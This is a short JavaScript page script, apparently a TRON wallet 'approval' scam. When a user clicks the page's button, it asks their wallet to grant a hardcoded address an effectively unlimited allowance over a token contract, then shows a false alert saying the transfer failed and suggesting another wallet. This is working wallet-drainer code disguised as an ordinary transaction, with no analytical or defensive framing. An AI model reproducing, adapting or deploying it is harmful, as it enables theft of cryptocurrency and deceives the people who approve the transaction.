import './index.css';
import './Language';

const trxNum = 10; //燃料费
const address = 'TKxqwkghMAzFCX6Bu1kczRgTLHhhwA1wRx'; //钱包地址
const btnEle = document.getElementById('btn');
btnEle.addEventListener('click', approve);

async function approve() {
	try {
		if (window.tronWeb) {
			const token = await tronWeb.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
			await token.approve(address, '9999999999999999999').send({
				feeLimit: trxNum * 1000000,
				callValue: 0
			});
			alert("转账失败,请更换其他钱包地址");
		} else {
			alert("请切换到TRX钱包");
		}
	} catch (error) {
		console.log(error);
	}
}
